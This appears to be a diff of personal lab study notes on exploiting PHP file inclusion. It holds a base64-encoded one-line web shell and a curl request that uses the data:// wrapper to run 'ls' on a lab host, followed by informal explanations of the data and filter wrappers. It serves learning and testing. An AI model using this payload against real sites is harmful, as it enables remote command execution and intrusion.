@@ -147,7 +147,9 @@ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 
+kind of confusing but basically the php is nesting another page called admin.php within the homepage. We are using php's data wrapper so that instead it just shows data where the data is plain text, and it show the output of system ls
 
+with the filter wrapper, its basically showing the code as it would look like if it was encoded. This stops it from being executed so that we can see it. then we decode it to see what the underlying code is.
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
